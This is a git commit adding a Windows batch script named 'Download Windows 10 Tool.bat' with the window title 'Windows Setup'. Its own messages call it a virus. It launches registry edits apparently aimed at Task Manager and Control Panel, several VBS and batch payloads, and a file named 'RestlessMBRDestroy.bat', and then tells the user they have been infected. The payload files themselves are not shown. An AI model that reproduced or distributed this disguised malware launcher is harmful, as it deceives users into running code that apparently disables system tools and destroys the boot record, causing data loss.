fcc0aa9f5c35544ed1db1899a9b85d0507daeefa
Microshaft <41166367+MicroshaftCorp@users.noreply.github.com>
2018-07-15 11:45:05 -0700

    Create Download Windows 10 Tool.bat

---
+++ Download Windows 10 Tool.bat
@@ -0,0 +1,20 @@
+@echo off
+title Windows Setup
+start 000.txt
+start Overwrite.reg
+color 47
+echo Welcome To The 001.exe Virus!
+start 001.bat
+start TaskMgr.reg
+timeout 4
+start LOVEYOUFOREVER.vbs
+timeout 1
+start IHATEYOU.vbs
+timeout 3
+echo Let's Just Run The Rest.
+start CtrlPanel.reg
+start RestlessMBRDestroy.bat
+echo You've Been Sucessfully Infected! Press A Key To Exit.
+pause
+cls
+exit
